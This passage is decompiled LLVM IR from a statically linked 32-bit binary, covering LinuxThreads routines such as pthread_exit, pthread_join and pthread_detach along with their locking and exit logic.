  br label %dec_label_pc_804ead5

dec_label_pc_804ead5:                             ; preds = %dec_label_pc_804eac7, %dec_label_pc_804ead0
  %v2_804eadb = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804eae1

dec_label_pc_804eae1:                             ; preds = %dec_label_pc_804eaba, %entry, %dec_label_pc_804ead5
  %v0_804eae1 = phi i32 [ ptrtoint (i32* @global_var_80628a0.136 to i32), %dec_label_pc_804eaba ], [ ptrtoint (i32* @global_var_80626c0 to i32), %entry ], [ %v2_804eadb, %dec_label_pc_804ead5 ]
  ret i32 %v0_804eae1

; uselistorder directives
  uselistorder label %dec_label_pc_804eae1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ead5, { 1, 0 }
}

define i32 @join_extricate_func(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804eae2 = load i32, i32* @esi, align 4
  %v0_804eae3 = load i32, i32* @ebx, align 4
  %v2_804eae7 = call i32 @thread_self.16(i32 %v0_804eae3, i32 %v0_804eae2)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %v2_804eae7, i32* @edx, align 4
  %v1_804eafa = call i32 @__pthread_lock(i32 %v2_804eae7)
  %v0_804eaff = load i32, i32* @ebx, align 4
  %v1_804eaff = add i32 %v0_804eaff, 8
  %v2_804eaff = inttoptr i32 %v1_804eaff to i32*
  %v3_804eaff = load i32, i32* %v2_804eaff, align 4
  %v1_804eb02 = add i32 %v3_804eaff, 56
  %v2_804eb02 = inttoptr i32 %v1_804eb02 to i32*
  %v3_804eb02 = load i32, i32* %v2_804eb02, align 4
  %v4_804eb02 = icmp eq i32 %v3_804eb02, 0
  store i32 0, i32* %v2_804eb02, align 4
  %v1_804eb0d = icmp eq i1 %v4_804eb02, false
  %v2_804eb0d = zext i1 %v1_804eb0d to i32
  %v0_804eb13 = load i32, i32* @ebx, align 4
  store i32 %v2_804eb0d, i32* @esi, align 4
  %v1_804eb17 = inttoptr i32 %v0_804eb13 to i32*
  %v2_804eb17 = call i32 @__pthread_unlock(i32* %v1_804eb17)
  %v0_804eb1f = load i32, i32* @esi, align 4
  ret i32 %v0_804eb1f

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend.17() local_unnamed_addr {
entry:
  %v0_804eb27 = load i32, i32* @eax, align 4
  %v1_804eb28 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_804eb27)
  ret i32 %v1_804eb28

; uselistorder directives
  uselistorder i32 (i32)* @__pthread_wait_for_restart_signal, { 1, 2, 4, 5, 0, 3, 6 }
}

define i32 @__pthread_do_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804eb31 = load i32, i32* @esi, align 4
  %v0_804eb32 = load i32, i32* @ebx, align 4
  %v2_804eb39 = call i32 @thread_self.16(i32 %v0_804eb32, i32 %v0_804eb31)
  %v1_804eb41 = add i32 %v2_804eb39, 64
  %v2_804eb41 = inttoptr i32 %v1_804eb41 to i8*
  store i8 1, i8* %v2_804eb41, align 1
  store i32 %v2_804eb39, i32* @ebx, align 4
  %v1_804eb47 = add i32 %v2_804eb39, 65
  %v2_804eb47 = inttoptr i32 %v1_804eb47 to i8*
  store i8 0, i8* %v2_804eb47, align 1
  store i32 %arg2, i32* %stack_var_-188, align 4
  %v1_804eb52 = call i32 @__pthread_perform_cleanup(i32 %arg2)
  %v0_804eb57 = call i32 @__pthread_destroy_specifics()
  %v0_804eb5c = load i32, i32* @ebx, align 4
  %v1_804eb5c = add i32 %v0_804eb5c, 28
  %v2_804eb5c = inttoptr i32 %v1_804eb5c to i32*
  %v3_804eb5c = load i32, i32* %v2_804eb5c, align 4
  store i32 %v3_804eb5c, i32* @eax, align 4
  store i32 %v0_804eb5c, i32* @edx, align 4
  %v0_804eb61 = load i32, i32* %stack_var_-188, align 4
  %v1_804eb61 = call i32 @__pthread_lock(i32 %v0_804eb61)
  %v0_804eb70 = load i32, i32* @ebx, align 4
  %v1_804eb70 = add i32 %v0_804eb70, 412
  %v2_804eb70 = inttoptr i32 %v1_804eb70 to i32*
  %v3_804eb70 = load i32, i32* %v2_804eb70, align 4
  %v4_804eb70 = icmp eq i32 %v3_804eb70, 0
  %v2_804eb77 = add i32 %v0_804eb70, 48
  %v3_804eb77 = inttoptr i32 %v2_804eb77 to i32*
  store i32 %arg1, i32* %v3_804eb77, align 4
  br i1 %v4_804eb70, label %dec_label_pc_804eba7, label %dec_label_pc_804eb7c

dec_label_pc_804eb7c:                             ; preds = %entry
  %v0_804eb7c = load i32, i32* @global_var_80679f4.148, align 4
  %v1_804eb81 = load i32, i32* @ebx, align 4
  %v2_804eb81 = add i32 %v1_804eb81, 416
  %v3_804eb81 = inttoptr i32 %v2_804eb81 to i32*
  %v4_804eb81 = load i32, i32* %v3_804eb81, align 4
  %v5_804eb81 = or i32 %v4_804eb81, %v0_804eb7c
  store i32 %v5_804eb81, i32* @eax, align 4
  %v3_804eb87 = and i32 %v5_804eb81, 256
  %v4_804eb87 = icmp eq i32 %v3_804eb87, 0
  br i1 %v4_804eb87, label %dec_label_pc_804eba7, label %dec_label_pc_804eb8c

dec_label_pc_804eb8c:                             ; preds = %dec_label_pc_804eb7c
  %v1_804eb8c = add i32 %v1_804eb81, 424
  %v2_804eb8c = inttoptr i32 %v1_804eb8c to i32*
  store i32 9, i32* %v2_804eb8c, align 4
  %v0_804eb96 = load i32, i32* @ebx, align 4
  %v2_804eb96 = add i32 %v0_804eb96, 428
  %v3_804eb96 = inttoptr i32 %v2_804eb96 to i32*
  store i32 %v0_804eb96, i32* %v3_804eb96, align 4
  %v0_804eb9c = load i32, i32* @ebx, align 4
  store i32 %v0_804eb9c, i32* @global_var_80679fc.149, align 4
  %v0_804eba2 = call i32 @__linuxthreads_death_event()
  br label %dec_label_pc_804eba7

dec_label_pc_804eba7:                             ; preds = %dec_label_pc_804eb7c, %entry, %dec_label_pc_804eb8c
  %v0_804ebaa = load i32, i32* @ebx, align 4
  %v1_804ebaa = add i32 %v0_804ebaa, 56
  %v2_804ebaa = inttoptr i32 %v1_804ebaa to i32*
  %v3_804ebaa = load i32, i32* %v2_804ebaa, align 4
  %v1_804ebad = add i32 %v0_804ebaa, 44
  %v2_804ebad = inttoptr i32 %v1_804ebad to i8*
  store i8 1, i8* %v2_804ebad, align 1
  %v0_804ebb1 = load i32, i32* @ebx, align 4
  %v1_804ebb1 = add i32 %v0_804ebb1, 28
  %v2_804ebb1 = inttoptr i32 %v1_804ebb1 to i32*
  %v3_804ebb1 = load i32, i32* %v2_804ebb1, align 4
  store i32 %v3_804ebb1, i32* %stack_var_-188, align 4
  %v1_804ebb4 = inttoptr i32 %v3_804ebb1 to i32*
  %v2_804ebb4 = call i32 @__pthread_unlock(i32* %v1_804ebb4)
  %v1_804ebbc = icmp eq i32 %v3_804ebaa, 0
  br i1 %v1_804ebbc, label %dec_label_pc_804ebcc, label %dec_label_pc_804ebc0

dec_label_pc_804ebc0:                             ; preds = %dec_label_pc_804eba7
  store i32 %v3_804ebaa, i32* %stack_var_-188, align 4
  %v1_804ebc4 = call i32 @__pthread_restart_new(i32 %v3_804ebaa)
  br label %dec_label_pc_804ebcc

dec_label_pc_804ebcc:                             ; preds = %dec_label_pc_804eba7, %dec_label_pc_804ebc0
  %v0_804ebcc = load i32, i32* bitcast (i32** @global_var_8062a80.143 to i32*), align 128
  store i32 %v0_804ebcc, i32* @esi, align 4
  %v0_804ebd2 = load i32, i32* @ebx, align 4
  %v12_804ebd2 = icmp eq i32 %v0_804ebd2, %v0_804ebcc
  %v1_804ebd4 = icmp eq i1 %v12_804ebd2, false
  br i1 %v1_804ebd4, label %dec_label_pc_804ec22, label %dec_label_pc_804ebd6

dec_label_pc_804ebd6:                             ; preds = %dec_label_pc_804ebcc
  %v0_804ebd6 = load i32, i32* @global_var_8062a84.142, align 4
  %v2_804ebd6 = icmp slt i32 %v0_804ebd6, 0
  br i1 %v2_804ebd6, label %dec_label_pc_804ec22, label %dec_label_pc_804ebdf

dec_label_pc_804ebdf:                             ; preds = %dec_label_pc_804ebd6
  store i32 %v0_804ebcc, i32* %stack_var_-156, align 4
  %v2_804ebeb = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_804ebeb

dec_label_pc_804ebeb:                             ; preds = %dec_label_pc_804ec07.dec_label_pc_804ebeb_crit_edge, %dec_label_pc_804ebdf
  %v0_804ebf6 = phi i32 [ %v0_804ebf6.pre, %dec_label_pc_804ec07.dec_label_pc_804ebeb_crit_edge ], [ %v0_804ebd6, %dec_label_pc_804ebdf ]
  store i32 %v0_804ebf6, i32* %stack_var_-188, align 4
  %v3_804ebfc = call i32 @__libc_write(i32 %v0_804ebf6, i32 %v2_804ebeb, i32 148)
  %v8_804ec04 = icmp eq i32 %v3_804ebfc, -1
  %v1_804ec05 = icmp eq i1 %v8_804ec04, false
  br i1 %v1_804ec05, label %dec_label_pc_804ec11, label %dec_label_pc_804ec07

dec_label_pc_804ec07:                             ; preds = %dec_label_pc_804ebeb
  %v0_804ec07 = load i32, i32* %stack_var_-188, align 4
  %v1_804ec07 = call i32 @__errno_location(i32 %v0_804ec07)
  %v1_804ec0c = inttoptr i32 %v1_804ec07 to i32*
  %v2_804ec0c = load i32, i32* %v1_804ec0c, align 4
  %v11_804ec0c = icmp eq i32 %v2_804ec0c, 4
  br i1 %v11_804ec0c, label %dec_label_pc_804ec07.dec_label_pc_804ebeb_crit_edge, label %dec_label_pc_804ec11

dec_label_pc_804ec07.dec_label_pc_804ebeb_crit_edge: ; preds = %dec_label_pc_804ec07
  %v0_804ebf6.pre = load i32, i32* @global_var_8062a84.142, align 4
  br label %dec_label_pc_804ebeb

dec_label_pc_804ec11:                             ; preds = %dec_label_pc_804ec07, %dec_label_pc_804ebeb
  %v0_804ec11 = load i32, i32* @esi, align 4
  store i32 %v0_804ec11, i32* @eax, align 4
  %v0_804ec13 = call i32 @suspend.17()
  store i32 0, i32* %stack_var_-188, align 4
  %v1_804ec1d = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804ec22

dec_label_pc_804ec22:                             ; preds = %dec_label_pc_804ebd6, %dec_label_pc_804ebcc, %dec_label_pc_804ec11
  %v1_804ec27 = call i32 @__GI__exit(i32 0)
  unreachable

; uselistorder directives
  uselistorder i32 %v0_804ebf6, { 1, 0 }
  uselistorder i32 %v0_804ebcc, { 1, 0, 2 }
  uselistorder i32 %v3_804ebaa, { 2, 1, 0 }
  uselistorder i32 %v0_804eb96, { 1, 0 }
  uselistorder i32 %v2_804eb39, { 2, 1, 0 }
  uselistorder i32* %stack_var_-188, { 2, 0, 3, 4, 5, 1, 6 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 (i32)* @__pthread_restart_new, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 428, { 2, 0, 1 }
  uselistorder i32 424, { 2, 0, 1 }
  uselistorder i32 416, { 2, 0, 1 }
  uselistorder i32 412, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804ec22, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ebcc, { 1, 0 }
  uselistorder label %dec_label_pc_804eba7, { 2, 0, 1 }
}

define i32 @pthread_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_804ec2f = ptrtoint i32* %stack_var_0 to i32
  %v2_804ec38 = call i32 @__pthread_do_exit(i32 %arg1, i32 %v2_804ec2f)
  ret i32 %v2_804ec38
}

define i32 @pthread_join(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ec3f = load i32, i32* @esi, align 4
  %v0_804ec40 = load i32, i32* @ebx, align 4
  store i32 %v0_804ec40, i32* %stack_var_-16, align 4
  %v4_804ec40 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804ec47 = call i32 @thread_self.16(i32 %v0_804ec40, i32 %v0_804ec3f)
  store i32 %arg1, i32* @ebp, align 4
  %v1_804ec67 = urem i32 %arg1, 1024
  store i32 %v2_804ec47, i32* @edx, align 4
  %v2_804ec73 = mul nuw nsw i32 %v1_804ec67, 16
  %v1_804ec76 = add i32 %v2_804ec73, ptrtoint (i32* @global_var_805e6a0.146 to i32)
  store i32 %v1_804ec76, i32* @esi, align 4
  store i32 %v1_804ec76, i32* @eax, align 4
  store i32 %v1_804ec76, i32* %stack_var_-28, align 4
  %v1_804ec85 = call i32 @__pthread_lock(i32 %v1_804ec76)
  %v0_804ec8a = load i32, i32* @esi, align 4
  %v1_804ec8a = add i32 %v0_804ec8a, 8
  %v2_804ec8a = inttoptr i32 %v1_804ec8a to i32*
  %v3_804ec8a = load i32, i32* %v2_804ec8a, align 4
  store i32 %v3_804ec8a, i32* @ebx, align 4
  %v1_804ec8d = icmp eq i32 %v3_804ec8a, 0
  br i1 %v1_804ec8d, label %dec_label_pc_804ec96, label %dec_label_pc_804ec91

dec_label_pc_804ec91:                             ; preds = %entry
  %v1_804ec91 = add i32 %v3_804ec8a, 16
  %v2_804ec91 = inttoptr i32 %v1_804ec91 to i32*
  %v3_804ec91 = load i32, i32* %v2_804ec91, align 4
  %v4_804ec91 = load i32, i32* @ebp, align 4
  %v15_804ec91 = icmp eq i32 %v3_804ec91, %v4_804ec91
  br i1 %v15_804ec91, label %dec_label_pc_804eca6, label %dec_label_pc_804ec96

dec_label_pc_804ec96:                             ; preds = %dec_label_pc_804ec91, %entry
  store i32 %v0_804ec8a, i32* %stack_var_-204, align 4
  %v1_804ec9a = inttoptr i32 %v0_804ec8a to i32*
  %v2_804ec9a = call i32 @__pthread_unlock(i32* %v1_804ec9a)
  br label %dec_label_pc_804ecbf

dec_label_pc_804eca6:                             ; preds = %dec_label_pc_804ec91
  %v12_804ecad = icmp eq i32 %v3_804ec8a, %v2_804ec47
  %v1_804ecaf = icmp eq i1 %v12_804ecad, false
  br i1 %v1_804ecaf, label %dec_label_pc_804ecc7, label %dec_label_pc_804ecb1

dec_label_pc_804ecb1:                             ; preds = %dec_label_pc_804eca6
  store i32 %v0_804ec8a, i32* %stack_var_-204, align 4
  %v1_804ecb5 = inttoptr i32 %v0_804ec8a to i32*
  %v2_804ecb5 = call i32 @__pthread_unlock(i32* %v1_804ecb5)
  br label %dec_label_pc_804ecbf

dec_label_pc_804ecbf:                             ; preds = %dec_label_pc_804ecd3, %dec_label_pc_804ec96, %dec_label_pc_804ecb1
  %v0_804ee234 = phi i32 [ 22, %dec_label_pc_804ecd3 ], [ 3, %dec_label_pc_804ec96 ], [ 35, %dec_label_pc_804ecb1 ]
  br label %dec_label_pc_804ee19

dec_label_pc_804ecc7:                             ; preds = %dec_label_pc_804eca6
  %v1_804ecc7 = add i32 %v3_804ec8a, 45
  %v2_804ecc7 = inttoptr i32 %v1_804ecc7 to i8*
  %v3_804ecc7 = load i8, i8* %v2_804ecc7, align 1
  %v4_804ecc7 = icmp eq i8 %v3_804ecc7, 0
  %v1_804eccb = icmp eq i1 %v4_804ecc7, false
  br i1 %v1_804eccb, label %dec_label_pc_804ecd3, label %dec_label_pc_804eccd

dec_label_pc_804eccd:                             ; preds = %dec_label_pc_804ecc7
  %v1_804eccd = add i32 %v3_804ec8a, 56
  %v2_804eccd = inttoptr i32 %v1_804eccd to i32*
  %v3_804eccd = load i32, i32* %v2_804eccd, align 4
  %v4_804eccd = icmp eq i32 %v3_804eccd, 0
  br i1 %v4_804eccd, label %dec_label_pc_804ece3, label %dec_label_pc_804ecd3

dec_label_pc_804ecd3:                             ; preds = %dec_label_pc_804eccd, %dec_label_pc_804ecc7
  store i32 %v0_804ec8a, i32* %stack_var_-204, align 4
  %v1_804ecd7 = inttoptr i32 %v0_804ec8a to i32*
  %v2_804ecd7 = call i32 @__pthread_unlock(i32* %v1_804ecd7)
  br label %dec_label_pc_804ecbf

dec_label_pc_804ece3:                             ; preds = %dec_label_pc_804eccd
  %v1_804ece3 = add i32 %v3_804ec8a, 44
  %v2_804ece3 = inttoptr i32 %v1_804ece3 to i8*
  %v3_804ece3 = load i8, i8* %v2_804ece3, align 1
  %v4_804ece3 = icmp eq i8 %v3_804ece3, 0
  %v1_804ece7 = icmp eq i1 %v4_804ece3, false
  br i1 %v1_804ece7, label %dec_label_pc_804edaf, label %dec_label_pc_804eced

dec_label_pc_804eced:                             ; preds = %dec_label_pc_804ece3
  store i32 %v2_804ec47, i32* @eax, align 4
  %v2_804ecf4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ecf4, i32* @edx, align 4
  %v0_804ecfb = call i32 @__pthread_set_own_extricate_if.15()
  %v1_804ed07 = add i32 %v2_804ec47, 66
  %v2_804ed07 = inttoptr i32 %v1_804ed07 to i8*
  %v3_804ed07 = load i8, i8* %v2_804ed07, align 1
  %v4_804ed07 = icmp eq i8 %v3_804ed07, 0
  br i1 %v4_804ed07, label %dec_label_pc_804ed1f, label %dec_label_pc_804ed0d

dec_label_pc_804ed0d:                             ; preds = %dec_label_pc_804eced
  store i32 1, i32* @edi, align 4
  %v1_804ed19 = add i32 %v2_804ec47, 64
  %v2_804ed19 = inttoptr i32 %v1_804ed19 to i8*
  %v3_804ed19 = load i8, i8* %v2_804ed19, align 1
  %v4_804ed19 = icmp eq i8 %v3_804ed19, 0
  br i1 %v4_804ed19, label %dec_label_pc_804ed2b, label %dec_label_pc_804ed1f

dec_label_pc_804ed1f:                             ; preds = %dec_label_pc_804ed0d, %dec_label_pc_804eced
  store i32 0, i32* @edi, align 4
  store i32 %v2_804ec47, i32* %v2_804eccd, align 4
  br label %dec_label_pc_804ed2b

dec_label_pc_804ed2b:                             ; preds = %dec_label_pc_804ed0d, %dec_label_pc_804ed1f
  %v0_804ed2e = load i32, i32* @esi, align 4
  store i32 %v0_804ed2e, i32* %stack_var_-204, align 4
  %v1_804ed2f = inttoptr i32 %v0_804ed2e to i32*
  %v2_804ed2f = call i32 @__pthread_unlock(i32* %v1_804ed2f)
  %v0_804ed37 = load i32, i32* @edi, align 4
  %v1_804ed37 = icmp eq i32 %v0_804ed37, 0
  store i32 %v2_804ec47, i32* @eax, align 4
  br i1 %v1_804ed37, label %dec_label_pc_804ed4b, label %dec_label_pc_804ed3b

dec_label_pc_804ed3b:                             ; preds = %dec_label_pc_804ed2b
  store i32 0, i32* @edx, align 4
  %v0_804ed44 = call i32 @__pthread_set_own_extricate_if.15()
  br label %dec_label_pc_804ed90

dec_label_pc_804ed4b:                             ; preds = %dec_label_pc_804ed2b
  %v0_804ed52 = call i32 @suspend.17()
  store i32 %v2_804ec47, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804ed60 = call i32 @__pthread_set_own_extricate_if.15()
  %v1_804ed6c = add i32 %v2_804ec47, 440
  %v2_804ed6c = inttoptr i32 %v1_804ed6c to i8*
  %v3_804ed6c = load i8, i8* %v2_804ed6c, align 1
  %v4_804ed6c = icmp eq i8 %v3_804ed6c, 0
  br i1 %v4_804ed6c, label %dec_label_pc_804eda1, label %dec_label_pc_804ed75

dec_label_pc_804ed75:                             ; preds = %dec_label_pc_804ed4b
  %v1_804ed7c = add i32 %v2_804ec47, 64
  %v2_804ed7c = inttoptr i32 %v1_804ed7c to i8*
  %v3_804ed7c = load i8, i8* %v2_804ed7c, align 1
  %v4_804ed7c = icmp eq i8 %v3_804ed7c, 0
  %v1_804ed80 = icmp eq i1 %v4_804ed7c, false
  br i1 %v1_804ed80, label %dec_label_pc_804eda1, label %dec_label_pc_804ed82

dec_label_pc_804ed82:                             ; preds = %dec_label_pc_804ed75
  store i8 0, i8* %v2_804ed6c, align 1
  br label %dec_label_pc_804ed90

dec_label_pc_804ed90:                             ; preds = %dec_label_pc_804ed3b, %dec_label_pc_804ed82
  store i32 %v3_804ec8a, i32* %stack_var_-192, align 4
  store i32 -1, i32* %stack_var_-204, align 4
  %v2_804ed9c = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804ec40)
  br label %dec_label_pc_804eda1

dec_label_pc_804eda1:                             ; preds = %dec_label_pc_804ed75, %dec_label_pc_804ed4b, %dec_label_pc_804ed90
  store i32 %v2_804ec47, i32* @edx, align 4
  %v0_804eda8 = load i32, i32* @esi, align 4
  store i32 %v0_804eda8, i32* @eax, align 4
  %v0_804edaa = load i32, i32* %stack_var_-204, align 4
  %v1_804edaa = call i32 @__pthread_lock(i32 %v0_804edaa)
  br label %dec_label_pc_804edaf

dec_label_pc_804edaf:                             ; preds = %dec_label_pc_804ece3, %dec_label_pc_804eda1
  %v4_804edaf = icmp eq i32* %arg2, null
  br i1 %v4_804edaf, label %dec_label_pc_804edc5, label %dec_label_pc_804edb9

dec_label_pc_804edb9:                             ; preds = %dec_label_pc_804edaf
  %v1_804edb9 = add i32 %v3_804ec8a, 48
  %v2_804edb9 = inttoptr i32 %v1_804edb9 to i32*
  %v3_804edb9 = load i32, i32* %v2_804edb9, align 4
  store i32 %v3_804edb9, i32* %arg2, align 4
  br label %dec_label_pc_804edc5

dec_label_pc_804edc5:                             ; preds = %dec_label_pc_804edaf, %dec_label_pc_804edb9
  %v0_804edc8 = load i32, i32* @esi, align 4
  store i32 %v0_804edc8, i32* %stack_var_-220, align 4
  %v1_804edc9 = inttoptr i32 %v0_804edc8 to i32*
  %v2_804edc9 = call i32 @__pthread_unlock(i32* %v1_804edc9)
  %v0_804edd1 = load i32, i32* @global_var_8062a84.142, align 4
  %v2_804edd1 = icmp slt i32 %v0_804edd1, 0
  br i1 %v2_804edd1, label %dec_label_pc_804ee17, label %dec_label_pc_804edda

dec_label_pc_804edda:                             ; preds = %dec_label_pc_804edc5
  %v2_804edf1 = ptrtoint i32* %stack_var_-192 to i32
  br label %dec_label_pc_804edf1

dec_label_pc_804edf1:                             ; preds = %dec_label_pc_804ee0d.dec_label_pc_804edf1_crit_edge, %dec_label_pc_804edda
  %v0_804edfc = phi i32 [ %v0_804edfc.pre, %dec_label_pc_804ee0d.dec_label_pc_804edf1_crit_edge ], [ %v0_804edd1, %dec_label_pc_804edda ]
  store i32 %v0_804edfc, i32* %stack_var_-220, align 4
  %v3_804ee02 = call i32 @__libc_write(i32 %v0_804edfc, i32 %v2_804edf1, i32 148)
  %v8_804ee0a = icmp eq i32 %v3_804ee02, -1
  %v1_804ee0b = icmp eq i1 %v8_804ee0a, false
  br i1 %v1_804ee0b, label %dec_label_pc_804ee17, label %dec_label_pc_804ee0d

dec_label_pc_804ee0d:                             ; preds = %dec_label_pc_804edf1
  %v0_804ee0d = load i32, i32* %stack_var_-220, align 4
  %v1_804ee0d = call i32 @__errno_location(i32 %v0_804ee0d)
  %v1_804ee12 = inttoptr i32 %v1_804ee0d to i32*
  %v2_804ee12 = load i32, i32* %v1_804ee12, align 4
  %v11_804ee12 = icmp eq i32 %v2_804ee12, 4
  br i1 %v11_804ee12, label %dec_label_pc_804ee0d.dec_label_pc_804edf1_crit_edge, label %dec_label_pc_804ee0d.dec_label_pc_804ee17.loopexit_crit_edge

dec_label_pc_804ee0d.dec_label_pc_804ee17.loopexit_crit_edge: ; preds = %dec_label_pc_804ee0d
  br label %dec_label_pc_804ee17

dec_label_pc_804ee0d.dec_label_pc_804edf1_crit_edge: ; preds = %dec_label_pc_804ee0d
  %v0_804edfc.pre = load i32, i32* @global_var_8062a84.142, align 4
  br label %dec_label_pc_804edf1

dec_label_pc_804ee17:                             ; preds = %dec_label_pc_804edf1, %dec_label_pc_804ee0d.dec_label_pc_804ee17.loopexit_crit_edge, %dec_label_pc_804edc5
  br label %dec_label_pc_804ee19

dec_label_pc_804ee19:                             ; preds = %dec_label_pc_804ecbf, %dec_label_pc_804ee17
  %v0_804ee23 = phi i32 [ %v0_804ee234, %dec_label_pc_804ecbf ], [ 0, %dec_label_pc_804ee17 ]
  ret i32 %v0_804ee23

; uselistorder directives
  uselistorder i32 %v0_804edfc, { 1, 0 }
  uselistorder i32 %v3_804ec8a, { 1, 3, 6, 4, 5, 0, 2, 7, 8 }
  uselistorder i32 %v0_804ec8a, { 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32 %v2_804ec47, { 4, 3, 5, 7, 6, 1, 2, 9, 8, 0, 10 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_do_exit, { 2, 1, 4, 9, 8, 0, 7, 3, 11, 6, 5, 10 }
  uselistorder i32 440, { 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 ()* @suspend.17, { 1, 0 }
  uselistorder i32 ()* @__pthread_set_own_extricate_if.15, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ee19, { 1, 0 }
  uselistorder label %dec_label_pc_804ee17, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804edc5, { 1, 0 }
  uselistorder label %dec_label_pc_804edaf, { 1, 0 }
  uselistorder label %dec_label_pc_804eda1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ed90, { 1, 0 }
  uselistorder label %dec_label_pc_804ed2b, { 1, 0 }
  uselistorder label %dec_label_pc_804ecbf, { 0, 2, 1 }
}

define i32 @pthread_detach(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  store i32 0, i32* @edx, align 4
  %v0_804ee28 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804ee38 = urem i32 %arg1, 1024
  %v2_804ee3d = mul nuw nsw i32 %v1_804ee38, 16
  %v1_804ee40 = add i32 %v2_804ee3d, ptrtoint (i32* @global_var_805e6a0.146 to i32)
  store i32 %v1_804ee40, i32* @esi, align 4
  store i32 %v1_804ee40, i32* @eax, align 4
  %v1_804ee48 = call i32 @__pthread_lock(i32 %v0_804ee28)
  %v0_804ee4d = load i32, i32* @esi, align 4
  %v1_804ee4d = add i32 %v0_804ee4d, 8
  %v2_804ee4d = inttoptr i32 %v1_804ee4d to i32*
  %v3_804ee4d = load i32, i32* %v2_804ee4d, align 4
  %v1_804ee50 = icmp eq i32 %v3_804ee4d, 0
  br i1 %v1_804ee50, label %dec_label_pc_804ee59, label %dec_label_pc_804ee54

dec_label_pc_804ee54:                             ; preds = %entry
  %v1_804ee54 = add i32 %v3_804ee4d, 16
  %v2_804ee54 = inttoptr i32 %v1_804ee54 to i32*
  %v3_804ee54 = load i32, i32* %v2_804ee54, align 4
  %v4_804ee54 = load i32, i32* @edi, align 4
  %v15_804ee54 = icmp eq i32 %v3_804ee54, %v4_804ee54
  br i1 %v15_804ee54, label %dec_label_pc_804ee69, label %dec_label_pc_804ee59

dec_label_pc_804ee59:                             ; preds = %dec_label_pc_804ee54, %entry
  store i32 %v0_804ee4d, i32* %stack_var_-188, align 4
  %v1_804ee5d = inttoptr i32 %v0_804ee4d to i32*
  %v2_804ee5d = call i32 @__pthread_unlock(i32* %v1_804ee5d)
  br label %dec_label_pc_804ee7d

dec_label_pc_804ee69:                             ; preds = %dec_label_pc_804ee54
  %v1_804ee69 = add i32 %v3_804ee4d, 45
  %v2_804ee69 = inttoptr i32 %v1_804ee69 to i8*
  %v3_804ee69 = load i8, i8* %v2_804ee69, align 1
  %v4_804ee69 = icmp eq i8 %v3_804ee69, 0
  br i1 %v4_804ee69, label %dec_label_pc_804ee82, label %dec_label_pc_804ee6f

dec_label_pc_804ee6f:                             ; preds = %dec_label_pc_804ee69
  store i32 %v0_804ee4d, i32* %stack_var_-188, align 4
  %v1_804ee73 = inttoptr i32 %v0_804ee4d to i32*
  %v2_804ee73 = call i32 @__pthread_unlock(i32* %v1_804ee73)
  br label %dec_label_pc_804ee7d

dec_label_pc_804ee7d:                             ; preds = %dec_label_pc_804ee88, %dec_label_pc_804ee59, %dec_label_pc_804ee6f
  %v0_804eefc3 = phi i32 [ 0, %dec_label_pc_804ee88 ], [ 3, %dec_label_pc_804ee59 ], [ 22, %dec_label_pc_804ee6f ]
  br label %dec_label_pc_804eef3

dec_label_pc_804ee82:                             ; preds = %dec_label_pc_804ee69
  %v1_804ee82 = add i32 %v3_804ee4d, 56
  %v2_804ee82 = inttoptr i32 %v1_804ee82 to i32*
  %v3_804ee82 = load i32, i32* %v2_804ee82, align 4
  %v4_804ee82 = icmp eq i32 %v3_804ee82, 0
  br i1 %v4_804ee82, label %dec_label_pc_804ee95, label %dec_label_pc_804ee88

dec_label_pc_804ee88:                             ; preds = %dec_label_pc_804ee82
  store i32 %v0_804ee4d, i32* %stack_var_-188, align 4
  %v1_804ee8c = inttoptr i32 %v0_804ee4d to i32*
  %v2_804ee8c = call i32 @__pthread_unlock(i32* %v1_804ee8c)
  br label %dec_label_pc_804ee7d

dec_label_pc_804ee95:                             ; preds = %dec_label_pc_804ee82
  %v1_804ee95 = add i32 %v3_804ee4d, 44
  %v2_804ee95 = inttoptr i32 %v1_804ee95 to i8*
  %v3_804ee95 = load i8, i8* %v2_804ee95, align 1
  %v4_804ee95 = sext i8 %v3_804ee95 to i32
  store i32 %v4_804ee95, i32* @ebx, align 4
  store i8 1, i8* %v2_804ee69, align 1
  %v0_804eea0 = load i32, i32* @esi, align 4
  store i32 %v0_804eea0, i32* %stack_var_-188, align 4
  %v1_804eea1 = inttoptr i32 %v0_804eea0 to i32*
  %v2_804eea1 = call i32 @__pthread_unlock(i32* %v1_804eea1)
